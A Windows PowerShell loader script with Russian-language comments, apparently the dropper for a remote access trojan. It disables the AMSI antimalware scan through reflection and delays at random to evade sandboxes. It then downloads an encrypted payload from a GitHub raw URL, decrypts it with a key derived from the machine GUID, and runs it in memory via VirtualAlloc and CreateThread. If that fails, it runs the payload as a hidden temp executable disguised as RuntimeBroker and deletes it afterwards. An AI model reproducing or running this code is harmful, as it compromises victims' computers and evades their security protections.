$ErrorActionPreference = 'SilentlyContinue'

# AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
try {
    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $context = $amsi.GetField('amsiContext','NonPublic,Static').GetValue($null)
    if ($context -ne $null) {
        $ptr = [Runtime.InteropServices.Marshal]::AllocHGlobal(4)
        [Runtime.InteropServices.Marshal]::WriteInt32($ptr, 0)
        $delegate = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($context, [Type]::GetType('System.Int32'))
        $delegate.Invoke([IntPtr]::Zero, $ptr)
    }
} catch {}

"AMSI bypassed" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8

Start-Sleep -Seconds (Get-Random -Minimum 15 -Maximum 45)
"Задержка завершена: $(Get-Date)" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8

$guid = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name MachineGuid -EA 0).MachineGuid
if (!$guid) { exit }
"MachineGUID получен" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8

# Скачивание и расшифровка
$url = "https://raw.githubusercontent.com/evilgrou-tech/drivers/refs/heads/main/RuntimeBroker_new.b64"
$raw = (Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 30).Content
$b64 = $raw -replace '[^A-Za-z0-9+/=]', ''
while ($b64.Length % 4 -ne 0) { $b64 += '=' }
$enc = [Convert]::FromBase64String($b64)

$len = [math]::Floor($enc.Length / 16) * 16
if ($len -lt $enc.Length) { $enc = $enc[0..($len-1)] }

$key = [Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($guid))
$aes = New-Object Security.Cryptography.AesCryptoServiceProvider
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Mode = [Security.Cryptography.CipherMode]::CBC
$aes.Padding = [Security.Cryptography.PaddingMode]::PKCS7
$aes.Key = $key
$aes.IV = [byte[]]@(0)*16

try {
    $payload = $aes.CreateDecryptor().TransformFinalBlock($enc, 0, $enc.Length)
    "Расшифровано байт: $($payload.Length)" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8

    if ($payload[0] -ne 0x4D -or $payload[1] -ne 0x5A) { 
        "MZ НЕ найден" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8
        exit 
    }
    "MZ найден — валидный PE" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8

    # Запуск в памяти (попытка RunPE)
    try {
        # Здесь можно вставить RunPE из предыдущих версий
        # Если RunPE не нужен — просто запускаем в текущем процессе
        Add-Type -MemberDefinition @'
        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
'@ -Name Win32 -Namespace Win32Functions -PassThru

        $MEM_COMMIT = 0x1000
        $PAGE_EXECUTE_READWRITE = 0x40
        $baseAddr = [Win32Functions.Win32]::VirtualAlloc([IntPtr]::Zero, $payload.Length, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)
        [Runtime.InteropServices.Marshal]::Copy($payload, 0, $baseAddr, $payload.Length)

        $oldProtect = 0
        [Win32Functions.Win32]::VirtualProtect($baseAddr, $payload.Length, $PAGE_EXECUTE_READWRITE, [ref]$oldProtect)

        $threadId = 0
        $hThread = [Win32Functions.Win32]::CreateThread([IntPtr]::Zero, 0, $baseAddr, [IntPtr]::Zero, 0, [ref]$threadId)

        "RunPE в текущем процессе запущен" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8

    } catch {
        "RunPE failed, fallback на файл" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8
        $tmpExe = "$env:TEMP\RuntimeBroker_tmp.exe"
        [IO.File]::WriteAllBytes($tmpExe, $payload)
        Start-Process $tmpExe -WindowStyle Hidden
        Start-Sleep -Seconds 3
        Remove-Item $tmpExe -Force -ErrorAction SilentlyContinue
    }

} catch {
    "Ошибка расшифровки: $_" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8
}

"Execution completed" | Out-File "$env:TEMP\rat_debug.log" -Append -Encoding utf8

# Бесконечная задержка — PowerShell не закрывается
while ($true) { Start-Sleep -Seconds 60 }